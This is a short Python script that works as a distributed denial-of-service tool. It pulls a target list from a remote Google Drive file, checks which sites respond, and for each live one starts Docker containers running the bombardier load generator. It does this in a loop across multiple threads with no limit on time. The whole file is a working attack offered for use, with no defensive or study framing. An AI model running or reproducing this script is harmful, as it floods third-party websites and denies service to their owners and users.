#!/usr/bin/env python

import config
import docker
import random
import re
import requests
try:
    import thread
except ImportError:
    import _thread as thread
import threading
import time
import sys

from datetime import datetime
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def check_availability(url, timeout):
    try:
        r = requests.head(url, verify=False, timeout=timeout)
        return r.status_code == 200
    except:
        return False

def ddos(threadName):
	while True:
		with printLock:
			print("%s [%s] ddos: Updating targets from URL" % (datetime.now(), threadName))
		response = requests.get(config.TARGETS)
		while response.status_code != 200:
			with printLock:
				print("%s [%s] ddos: Failed. Retrying in 10 sec" % (datetime.now(), threadName))
			time.sleep(10)
			response = requests.get(config.TARGETS)

		SOURCE_URLS = list(set(response.content.decode('utf-8').splitlines()))
		random.shuffle(SOURCE_URLS)

		with printLock:
			print("%s [%s] ddos: Processing targets" % (datetime.now(), threadName))
		for url in SOURCE_URLS:
			if config.LIMIT > 0:
				while len(client.containers.list(filters={'name':config.PREFIX,'status':'running'})) >= config.LIMIT:
					print("%s [%s] ddos: Containers limit %i reached. Retrying in 1 min" % (datetime.now(), threadName, config.LIMIT))
					time.sleep(60)
			if check_availability(url, config.TIMEOUT):
				with printLock:
					print("%s [%s] ddos: * %s - UP, start/continue DDoS" % (datetime.now(), threadName, url))
				try:
					client.containers.run(
						name = config.PREFIX + url.split('/')[2],
						image = 'alpine/bombardier',
						command = '-c ' + str(config.CONNECTIONS) + ' -d ' + str(config.DURATION) + 's ' + url,
						detach = True,
						remove = True,
					)
				except:
					pass
			else:
				with printLock:
					print("%s [%s] ddos: * %s - DOWN" % (datetime.now(), threadName, url))

config.TARGETS = 'https://drive.google.com/uc?id=' + re.match('^.*d/(.+?)/view.*$', config.TARGETS).group(1)

try:
	client = docker.from_env()
except:
	sys.exit('Docker is not installed or the user has no permission to manage it')

printLock = threading.Lock()

for threadNum in range(1, config.THREADS+1):
	try:
		thread.start_new_thread(ddos, ('Thread-' + str(threadNum),))
	except:
		sys.exit('Error. Unable to start thread')

while True:
	pass
